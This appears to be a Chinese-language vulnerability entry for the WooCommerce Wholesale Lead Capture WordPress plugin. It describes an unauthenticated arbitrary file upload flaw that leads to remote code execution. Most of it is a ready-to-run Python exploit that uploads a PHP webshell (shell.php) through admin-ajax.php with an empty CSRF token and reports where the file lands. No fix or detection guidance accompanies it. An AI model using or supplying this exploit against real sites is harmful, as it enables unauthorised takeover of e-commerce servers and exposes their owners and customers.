### 漏洞描述
WooCommerce Wholesale Lead Capture 插件存在未认证任意文件上传漏洞。攻击者无需登录即可通过上传功能上传任意 PHP 文件（如 webshell），导致远程代码执行和完全服务器控制。该插用于 WooCommerce 电商网站的批发客户注册流程。

### POC/利用
```python
import requests
import sys

def exploit(target, payload_path):
    url = f"{target}/wp-admin/admin-ajax.php"
    with open(payload_path, "rb") as f:
        payload_content = f.read()
    files = {"file": ("shell.php", payload_content, "application/octet-stream")}
    data = {"action": "wwlc_upload_file", "wwlc_csrf": ""}
    try:
        response = requests.post(url, files=files, data=data, timeout=10)
        if response.status_code == 200:
            print(f"[+] Upload successful!")
            print(f"[+] Check: {target}/wp-content/uploads/wwlc-temp*/")
        else:
            print(f"[-] Upload failed: {response.status_code}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <payload.php>")
        sys.exit(1)
    exploit(sys.argv[1], sys.argv[2])
```
